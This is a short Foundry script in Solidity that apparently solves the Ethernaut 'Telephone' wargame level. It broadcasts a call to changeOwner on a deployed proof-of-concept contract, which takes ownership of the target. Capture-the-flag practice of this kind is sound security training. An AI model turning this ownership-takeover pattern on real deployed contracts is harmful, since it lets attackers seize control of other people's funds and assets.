// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "Ethernaut/telephone_poc.sol";
import "forge-std/console.sol";

contract TelephonePOCScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        //console.log current network
        vm.startBroadcast(deployerPrivateKey);

        TelephonePOC telephonePOC = TelephonePOC(0xEDc56a4129C95f2a89F6C3df960E7A7917c90e37);

        telephonePOC.changeOwner(address(0x63c34506f4f6280D42E7533Ae1d1d657ca4C6c3B));
        vm.stopBroadcast();
    }
}